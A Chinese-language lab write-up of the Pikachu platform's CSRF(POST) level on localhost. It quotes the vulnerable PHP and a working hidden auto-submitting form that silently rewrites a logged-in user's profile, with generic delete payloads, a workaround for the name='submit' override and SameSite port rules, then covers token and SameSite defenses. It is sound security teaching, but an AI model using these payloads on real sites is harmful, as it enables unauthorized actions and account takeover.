---
layout: post
title: Pikachu - CSRF(POST) Writeup（含自动提交表单与 name="submit" 陷阱）
platform: pikachu
date: 2026-10-25 22:29:00 +0800
categories: CTF
---

Pikachu - CSRF(POST) Writeup（含自动提交表单与 name="submit" 陷阱）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：CSRF → CSRF(post)
- 入口：`http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_login.php`
- 题型：Web
- 考点：**POST 型 CSRF**、自动提交表单、**`name="submit"` 覆盖 JS 方法陷阱**、SameSite 与端口

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**测试账号**（同第 1 关）：

```text
vince / allen / kobe / grady / kevin / lucy / lili
密码全部是 123456
```

**✅ 实测结果**

```text
★ 攻击前：
    姓名: vince
    性别: boy
    手机: 18626545453
    住址: chain
    邮箱: vince@pikachu.com

★ 攻击后（受害者只"打开了一个网页"，没点任何按钮）：
    姓名: vince
    性别: hacked
    手机: 88888888
    住址: post_csrf
    邮箱: me@test.com

★ 数据库确认：
    mysql> select sex,phonenum,address,email from member where username='vince';
    hacked | 88888888 | post_csrf | me@test.com          ✅ 真的被改了

★ 攻击页部署方式：
    方法 A：放到 http://localhost/pikachu/attack2.html（需管理员权限写 D 盘）
    方法 B：python -m http.server 8000 → http://localhost:8000/attack2.html（推荐）
    ★ 方法 B 能成功，因为 SameSite 判断"同站"时【不看端口】
```

二、题目分析

**① 和第 1 关的唯一区别：GET → POST**

```php
// 第 1 关 csrf_get_edit.php
if(isset($_GET['submit'])){
    $getdata = escape($link, $_GET);

// 第 2 关 csrf_post_edit.php
if(isset($_POST['submit'])){          // ★ 就改了这几个字
    $getdata = escape($link, $_POST);
```

**★ 漏洞一模一样，只是数据从 URL 挪到了请求体。**

**② 后端代码（完整逻辑）**

```php
<?php
// csrf_post_edit.php

if(!check_csrf_login($link)){                    // ① 只检查"有没有登录"
    header("location:csrf_post_login.php");
}

$html1 = '';
if(isset($_POST['submit'])){
    if($_POST['sex'] && $_POST['phonenum'] && $_POST['add'] && $_POST['email']){

        $getdata = escape($link, $_POST);

        // ② 直接用 POST 参数拼 UPDATE
        $query = "update member set
                    sex='{$getdata['sex']}',
                    phonenum='{$getdata['phonenum']}',
                    address='{$getdata['add']}',
                    email='{$getdata['email']}'
                  where username='{$_SESSION['csrf']['username']}'";

        $result = execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:csrf_post.php");    // 改成功就跳转
        }
    }
}
?>
```

```html
<!-- 表单 -->
<form method="post">
    <p>性别:<input type="text" name="sex"      value="{$sex}"/></p>
    <p>手机:<input type="text" name="phonenum" value="{$phonenum}"/></p>
    <p>住址:<input type="text" name="add"      value="{$add}"/></p>
    <p>邮箱:<input type="text" name="email"    value="{$email}"/></p>
    <input type="submit" name="submit" value="submit"/>
</form>
```

**③ 三个致命缺失（和 GET 版一样）**

```text
① 没有 CSRF token
   → 无法证明"这个请求来自我自己的页面"

② 没有 Referer / Origin 检查
   → 无法证明"请求从哪来的"

③ 用 session 里的用户名决定改谁
   → 谁带着有效 cookie 来，就改谁
```

**④ ⚠️ 关键认知：改成 POST 不等于安全**

**很多人（包括一些开发者）认为**：

```text
"GET 参数在 URL 里，别人能做链接 → 改成 POST 就安全了"
```

**★ 这是错的。**

**原因**：

```text
攻击者有无数种方式伪造 POST 请求：

① 自动提交的表单（最常用）
   <form method="POST"><input ...></form>
   <script>form.submit()</script>

② fetch / XHR（受 CORS 限制，但简单请求能发出去）

③ 隐藏的 <iframe> 里放表单

★ POST 只是"投递方式"变了，"没有身份验证"的本质没变
```

**⑤ 攻击载荷的写法（能发 POST 的 HTML）**

```html
<form action="http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
      method="POST" id="csrfForm" style="display:none">
    <input type="hidden" name="sex"      value="hacked">
    <input type="hidden" name="phonenum" value="88888888">
    <input type="hidden" name="add"      value="post_csrf">
    <input type="hidden" name="email"    value="me@test.com">
    <input type="hidden" name="submit"   value="submit">
</form>

<script>
    HTMLFormElement.prototype.submit.call(document.getElementById('csrfForm'));
</script>
```

**★ `style="display:none"` = 页面上看不见**

**★ `<script>` 自动调用 submit() = 页面一加载就发请求**

**⑥ 🐛 一个真实的坑：`name="submit"` 会覆盖 `submit()` 方法**

**这是本题踩到的最大坑，非常值得记录。**

**错误的写法**：

```html
<form id="csrfForm">
    ...
    <input type="hidden" name="submit" value="submit">    <!-- ★ 罪魁祸首 -->
</form>

<script>
    document.getElementById('csrfForm').submit();          // ❌ 报错！
</script>
```

**浏览器控制台报**：

```
Uncaught TypeError: document.getElementById(...).submit is not a function
```

**原因**：

```text
HTML 表单对象上有一批"内置属性/方法"：
    form.submit     ← 方法：提交表单
    form.action     ← 属性：提交地址
    form.method     ← 属性：提交方式
    form.length     ← 属性：表单元素个数
    form.elements   ← 属性：所有元素

如果表单里有一个 <input name="submit">
    → 这个 input 会【覆盖】form.submit 属性
    → form.submit 不再指向方法，而指向那个 <input> 元素
    → form.submit() 就报 "is not a function"
```

**验证（在浏览器控制台里）**：

```javascript
var f = document.getElementById('csrfForm');

console.log(typeof f.submit);   // 输出 "object"（不是 "function"！）
console.log(f.submit);          // 输出 <input name="submit" ...>
```

**正确的写法（两种）**：

```javascript
// ✅ 方法 1：绕过属性访问，直接调用原型上的方法
HTMLFormElement.prototype.submit.call(document.getElementById('csrfForm'));

// ✅ 方法 2：用 requestSubmit()（名字不冲突）
document.getElementById('csrfForm').requestSubmit();
```

**★ 哪些 name 会踩坑**：

```text
name="submit"    → 覆盖 submit()
name="action"    → 覆盖 action 属性
name="method"    → 覆盖 method 属性
name="length"    → 覆盖 length 属性
name="elements"  → 覆盖 elements 属性

★ 通用规则：不要用 DOM 属性名当表单字段名
★ 但 CSRF 攻击时必须用 name="submit"（服务器的判断条件）
★ 所以只能用"原型方法"绕过
```

三、解题步骤

**第 1 步：登录（GET，可以直接用 URL）**

```text
http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_login.php?username=vince&password=123456&submit=submit
```

**注意登录页用的是 GET**：

```php
// csrf_post_login.php
if(isset($_GET['submit'])){       // ← 登录居然用 GET（本身也是问题）
    if($_GET['username']!=null && $_GET['password']!=null){
```

**★ 登录后跳到 `csrf_post.php`（会员中心），看到**：

```
hello,vince,欢迎来到个人会员中心

姓名: vince
性别: boy
手机: 18626545453
住址: chain
邮箱: vince@pikachu.com
```

**★ 记住这四个值，等下对比。**

**第 2 步：确认修改接口是 POST**

```text
① 点"修改个人信息" → 进入 csrf_post_edit.php
② F12 → 【元素】→ 找到 <form>
③ 看到：<form method="post">
④ F12 → 【网络】，随便提交一次，看请求：
     方法: POST
     负载: sex=...&phonenum=...&add=...&email=...&submit=submit
```

**★ 这里就能确认：第 2 关是 POST。**

**第 3 步：写攻击页**

**新建 `attack2.html`**：

```html
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>加载中... 请稍候</title></head>
<body>
    <h1>🎬 视频加载中，请稍候...</h1>
    <p>你以为你在看视频，其实此刻发生了一件事。</p>

    <!-- ★ 攻击载荷：隐藏的表单 -->
    <form action="http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
          method="POST" id="csrfForm" style="display:none">
        <input type="hidden" name="sex"      value="hacked">
        <input type="hidden" name="phonenum" value="88888888">
        <input type="hidden" name="add"      value="post_csrf">
        <input type="hidden" name="email"    value="me@test.com">
        <input type="hidden" name="submit"   value="submit">
    </form>

    <script>
        // ★ 不能写 form.submit()，会被 name="submit" 覆盖
        HTMLFormElement.prototype.submit.call(document.getElementById('csrfForm'));
    </script>
</body>
</html>
```

**★ 就这些，20 行左右。**

**第 4 步：把攻击页放到"同站"位置**

**这里有两个选择，第二个更省事。**

**方法 A：放进 pikachu 目录**（需要管理员权限）

```powershell
# 普通 PowerShell 会报"访问被拒绝"
# 需要用【管理员 PowerShell】执行
Copy-Item "attack2.html" "D:\phpstudy_pro\WWW\pikachu\attack2.html"
```

**然后访问**：

```
http://localhost/pikachu/attack2.html
```

**方法 B：起一个本地 HTTP 服务器**（不用管理员，推荐）

```powershell
# 在 attack2.html 所在目录
cd C:\Users\cecilia\Documents\deepseek-harness\default-workspace\csrf-demo
python -m http.server 8000
```

**然后访问**：

```
http://localhost:8000/attack2.html
```

**★ 为什么 8000 端口也能打通？见下一节。**

**第 5 步：验证攻击**

```text
① 保持 pikachu 那边的登录状态（会员中心能打开）
② 打开攻击页 http://localhost:8000/attack2.html
③ 页面显示"视频加载中"
④ 标签页会自己"跳走"（表单提交 + 302 跳转）
⑤ 切回会员中心，按 F5
⑥ 看到资料变了：

    性别: hacked
    手机: 88888888
    住址: post_csrf
    邮箱: me@test.com
```

**★ 全程没有点任何按钮。**

**第 6 步：⭐ 为什么"不同端口"也算同站**

**这是本题最有价值的知识点。**

**先看现象**：

```
攻击页: http://localhost:8000/attack2.html      （8000 端口）
目标:   http://localhost/pikachu/...edit.php    （80 端口）

★ 端口不一样，但攻击成功了
```

**原因：SameSite 计算"同站"时不看端口**

```text
SameSite 的"site"定义 = 协议（scheme）+ 可注册域名（eTLD+1）

    http  +  localhost   →  site = localhost
    http  +  localhost   →  site = localhost
                            ↑ 完全相同 → 同站

★ 端口（8000 vs 80）不参与这个判断
★ 路径（/attack2.html vs /pikachu/）也不参与
```

**对比表格**：

| 攻击页地址 | 目标地址 | 同站？ | POST 带 cookie？ |
|---|---|---|---|
| `file:///C:/...` | `http://localhost/` | ❌ 跨站 | ❌ 不带 |
| `http://127.0.0.1:8000/` | `http://localhost/` | ❌ 跨站（域名不同）| ❌ 不带 |
| **`http://localhost:8000/`** | **`http://localhost/`** | ✅ **同站** | ✅ **带** |
| `http://localhost/pikachu/` | `http://localhost/pikachu/` | ✅ 同站 | ✅ 带 |

**★ 注意第二行**：

```
127.0.0.1 和 localhost 是【不同的主机名】
→ 虽然指向同一台机器，但 SameSite 认为是跨站！
★ 这是一个很容易踩的坑
```

**第 7 步：踩坑排查（如果失败）**

**用 F12 网络面板看那条请求**：

```text
① 在攻击页按 F12 → 【网络】
② F5 刷新
③ 找 csrf_post_edit.php 那条请求

结果分析：
    · 没有这条请求        → 表单没提交（JS 报错，最常见是 name="submit" 那个坑）
    · 有请求但没有 Cookie  → SameSite 拦截（跨站）
    · 有请求 → 302 到登录页 → cookie 无效 / 没登录
    · 有请求 → 302 到 csrf_post.php → 成功，回会员中心刷新即可
```

**★ 第一步永远是"看请求发没发出去、带没带 cookie"。**

四、延伸知识

**① GET 型 vs POST 型 CSRF（完整对比）**

| | CSRF(GET) | CSRF(POST) |
|---|---|---|
| **数据位置** | URL 查询串 | 请求体 |
| **攻击载荷** | `<img src="...">` | `<form>` + `submit()` |
| **需要 JS 吗** | ❌ | ✅（自动提交）|
| **隐蔽性** | 极高（1px 图片）| 高（display:none 表单）|
| **能不能被"改 POST"防住** | — | ❌ **不能** |
| **SameSite=Lax 下** | ⚠️ 顶层导航 GET 会带 cookie | ❌ 跨站一律不带 |
| **是否会被 URL 长度限制** | 会 | 不会 |

**★ 核心结论**：

```
"改成 POST" 只是抬高了一点点门槛
真正能防住的是：CSRF Token、SameSite=Strict、二次验证
```

**② 三种 CSRF 攻击载荷（按能力排序）**

**载荷 1：`<img>`（只能 GET）**

```html
<img src="http://target/api?action=delete&id=1" style="display:none">
```

**载荷 2：`<iframe>`（只能 GET，但能加载页面）**

```html
<iframe src="http://target/api?..." style="display:none"></iframe>
```

**载荷 3：`<form>` + `submit()`（能 POST，最通用）**

```html
<form method="POST" action="http://target/api" id="f" style="display:none">
    <input name="action" value="delete">
</form>
<script>HTMLFormElement.prototype.submit.call(document.getElementById('f'));</script>
```

**★ 载荷 3 的能力最强，因为什么请求都能发。**

**③ SameSite 的完整规则（含端口陷阱）**

```text
SameSite=Strict
    跨站请求 → 完全不带 cookie
    连点链接跳转都不带（体验差，但最安全）

SameSite=Lax（现代浏览器默认）
    跨站 + 顶层导航 + 安全方法（GET/HEAD）→ ✅ 带
    跨站 + 顶层导航 + POST              → ❌ 不带
    跨站 + 子资源（img/iframe/fetch）    → ❌ 不带
    同站（任何情况）                     → ✅ 带

SameSite=None
    任何情况都带（必须配 Secure + HTTPS）
```

**★ "同站"的定义（重点）**：

```text
site = scheme + registrable domain

    http://localhost:8000     → site = (http, localhost)
    http://localhost:80       → site = (http, localhost)
                                ↑ 同站！端口不参与

    http://127.0.0.1:8000     → site = (http, 127.0.0.1)
    http://localhost:80       → site = (http, localhost)
                                ↑ 跨站！主机名不同

    https://localhost:8000    → site = (https, localhost)
    http://localhost:80       → site = (http, localhost)
                                ↑ 跨站！协议不同（schemeful same-site）
```

**④ 真实世界的 CSRF 危害**

| 场景 | 后果 |
|---|---|
| 网银转账 | **钱被转走** |
| 修改密码 | 账号被接管 |
| 修改绑定邮箱 | 后续找回密码被劫持 |
| 以你的名义发帖 | 名誉受损 / 传播恶意内容 |
| 关注 / 点赞 / 投票 | 刷量 |
| **管理员后台操作** | **整个系统被控制**（危害最大）|
| 提交订单 | 恶意下单 |
| 绑定第三方账号 | 账号关联被劫持 |

**★ 关键词**：

```
"以你的身份，做你没想做的事"
```

**⑤ 防御手段（从弱到强）**

| 手段 | 强度 | 说明 |
|---|---|---|
| 只靠 session 认证 | ❌ | 就是本关的漏洞 |
| 改成 POST | ❌ | **无效**（本关证明了）|
| 检查 Referer | ⚠️ | 可被绕过（Referer 可空、可伪造）|
| 检查 Origin | ⚠️ | 比 Referer 可靠，但老浏览器不支持 |
| **CSRF Token** | ✅✅ | 最经典有效 |
| **SameSite=Strict** | ✅✅ | 现代主流，浏览器层拦截 |
| **二次确认**（输密码/验证码）| ✅✅✅ | 最强，但影响体验 |
| 自定义请求头 | ✅ | 跨站发不了自定义头（CORS 限制）|

**⑥ 正确实现 CSRF Token**

```php
<?php
// ① 生成（每次会话一个，或每次请求一个）
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ② 嵌进表单
?>
<form method="post">
    <input type="hidden" name="csrf_token"
           value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
    ...
</form>

<?php
// ③ 校验（用 hash_equals 防时序攻击）
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    die("CSRF token invalid");
}

// ④ 用完销毁（防重放）
unset($_SESSION['csrf_token']);
```

**⑦ 现代方案：SameSite Cookie**

```php
// 最简单有效的现代做法
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'httponly' => true,
    'secure'   => true,        // 必须 HTTPS
    'samesite' => 'Strict',    // ★ 浏览器层拦掉跨站请求
]);
session_start();
```

**★ `SameSite=Strict` + `HttpOnly` + `Secure` 是现代 Web 的标配。**

**⑧ 一个小实验：验证 `name="submit"` 的覆盖**

**在任意含表单的页面上，F12 控制台里跑**：

```javascript
// 造一个表单
var f = document.createElement('form');
f.id = 'test';
f.innerHTML = '<input name="submit" value="x">';
document.body.appendChild(f);

// 看 submit 属性变成什么了
console.log(typeof f.submit);   // "object"（不是 "function"）
console.log(f.submit);          // <input name="submit" value="x">
console.log(f.submit.tagName);  // "INPUT"

// 正确调用方式
HTMLFormElement.prototype.submit.call(f);   // 能正常提交
```

**★ 这个实验 30 秒做完，但能让你记一辈子。**

**⑨ 本地靶场的"时代错位"再谈**

```text
pikachu 写于 2019 年
    → 当时浏览器不限制跨站 cookie
    → 这类攻击真实可行

现在（2026 年）：
    → Chrome/Edge 默认 SameSite=Lax
    → 跨站 POST 一律不带 cookie
    → 第 1 关（GET + img）打不通
    → 第 2 关（POST）也必须"同站"才能打通

★ 这不是靶场过时了，是浏览器进化了
★ 理解"为什么现在打不通"，比"当年怎么打"更有价值
```

五、总结

- **本题核心：改资料接口用 POST 提交，但同样没有 token / Referer 检查 → 自动提交的表单就能改别人的资料。**

- **攻击载荷（20 行，页面看不见）**：

```html
<form action="http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
      method="POST" id="csrfForm" style="display:none">
    <input name="sex"      value="hacked">
    <input name="phonenum" value="88888888">
    <input name="add"      value="post_csrf">
    <input name="email"    value="me@test.com">
    <input name="submit"   value="submit">
</form>
<script>HTMLFormElement.prototype.submit.call(document.getElementById('csrfForm'));</script>
```

- **⭐ 三个必记的关键点**：

```text
① 改成 POST 不是安全措施
   → 攻击者用 <form> + submit() 就能伪造 POST
   → 真正有效的是 CSRF Token / SameSite=Strict

② name="submit" 会覆盖 form.submit() 方法
   → 报错 "submit is not a function"
   → 解决：HTMLFormElement.prototype.submit.call(form)

③ SameSite 判断"同站"时不看端口
   → http://localhost:8000 和 http://localhost:80 是同站
   → 但 127.0.0.1 和 localhost 是【跨站】（主机名不同）
```

- **实测数据**：

```text
攻击前: boy      / 18626545453 / chain     / vince@pikachu.com
攻击后: hacked   / 88888888    / post_csrf / me@test.com

数据库确认：真的被改了
攻击页：http://localhost:8000/attack2.html（python -m http.server 8000）
受害者操作：只"打开了一个网页"，没点任何按钮
```

- **CSRF 模块进度**：

```text
✅ CSRF(get)    —— GET 型，<img> 就能打；现代浏览器被 SameSite 拦
✅ CSRF(post)   —— 本题：POST 型，需自动提交表单；同站可打通
⬜ CSRF Token   —— 有 token 防护，看怎么突破（呼应暴力破解第 4 关）
```

**手工复现要点**：

```text
· 登录：csrf_post_login.php?username=vince&password=123456&submit=submit
· 记住原始资料，方便对比
· 写一个自动提交的 <form>（注意 name="submit" 的坑）
· 放到同站位置（pikachu 目录 或 python -m http.server 8000）
· 打开攻击页 → 回会员中心 F5 → 看资料变没变
· 没变 → F12 看请求有没有发出去、有没有 Cookie
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  "改成 POST 就安全了" —— 这是最大的误解                       │
│                                                            │
│  GET  → <img src="...">            1 行                    │
│  POST → <form> + submit()          6 行                    │
│                                                            │
│  攻击成本只增加了 5 行代码                                    │
│  防护效果 = 0                                               │
│                                                            │
│  ★ 能防住 CSRF 的只有：Token / SameSite=Strict / 二次验证    │
│  ★ 现代浏览器默认 SameSite=Lax，已经替你挡掉了大部分           │
└────────────────────────────────────────────────────────────┘
```
